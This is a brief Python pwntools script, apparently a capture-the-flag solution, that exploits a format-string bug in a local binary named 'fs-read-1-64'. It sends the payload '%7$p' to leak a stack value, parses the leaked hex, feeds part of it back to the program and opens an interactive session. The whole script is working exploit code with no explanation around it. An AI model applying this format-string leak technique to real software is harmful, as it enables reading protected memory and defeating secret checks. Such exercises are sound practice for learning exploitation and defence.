#!/usr/bin/env python

from pwn import *

p = process('./fs-read-1-64')

print(p.recv())
p.sendline("%7$p")

data = p.recv()

print(repr(data))

hex_val = data.split(' ')[1].split('\n')[0]
p.sendline(hex_val[:-8])
p.interactive()
